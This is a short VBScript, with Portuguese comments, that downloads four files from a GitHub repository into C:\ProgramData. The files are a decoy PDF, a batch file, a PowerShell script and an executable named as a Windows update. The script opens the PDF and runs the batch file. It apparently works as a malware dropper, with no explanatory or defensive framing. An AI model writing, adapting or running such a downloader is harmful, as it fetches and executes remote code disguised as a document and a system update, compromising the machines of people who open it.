 dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "https://raw.githubusercontent.com/2o2ks/lutfica/main/TAREFA785.pdf", False
xHttp.Send

with bStrm
.type = 1 '//binary
.open
.write xHttp.responseBody
.savetofile "C:\ProgramData\TAREFA.PDF", 2 '//overwrite
end with

Dim objShell
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "C:\ProgramData\TAREFA.PDF", 1, false
Set objShell = Nothing


Dim xHttp2: Set xHttp2 = CreateObject("Microsoft.XMLHTTP")
Dim bStrm2: Set bStrm2 = CreateObject("Adodb.Stream")

' Baixar e salvar o segundo arquivo
xHttp2.Open "GET", "https://raw.githubusercontent.com/2o2ks/ZeroTier/main/reiniciar.bat", False
xHttp2.Send

With bStrm2
    .Type = 1 '// binary
    .Open
    .Write xHttp2.responseBody
    .SaveToFile "C:\ProgramData\reiniciar.bat", 2 '// overwrite
    .Close
End With

Dim objShell2
Set objShell2 = CreateObject("WScript.Shell")
objShell2.Run "C:\ProgramData\reiniciar.bat", 1, False
Set objShell2 = Nothing
Dim xHttp3: Set xHttp3 = CreateObject("Microsoft.XMLHTTP")
Dim bStrm3: Set bStrm3 = CreateObject("Adodb.Stream")

' Baixar e salvar o terceiro arquivo
xHttp3.Open "GET", "https://raw.githubusercontent.com/2o2ks/lutfica/main/a.ps1", False
xHttp3.Send

With bStrm3
    .Type = 1 '// binary
    .Open
    .Write xHttp3.responseBody
    .SaveToFile "C:\ProgramData\a.ps1", 2 '// overwrite
    .Close
End With
Dim xHttp4: Set xHttp4 = CreateObject("Microsoft.XMLHTTP")
Dim bStrm4: Set bStrm4 = CreateObject("Adodb.Stream")

' Baixar e salvar o quarto arquivo
xHttp4.Open "GET", "https://raw.githubusercontent.com/2o2ks/lutfica/main/ATUALIZA%C3%87%C3%83O%20DO%20WINDOWS.exe", False
xHttp4.Send

With bStrm4
    .Type = 1 '// binary
    .Open
    .Write xHttp4.responseBody
    .SaveToFile "C:\ProgramData\ATUALIZAR WINDOWS.exe", 2 '// overwrite
    .Close
End With






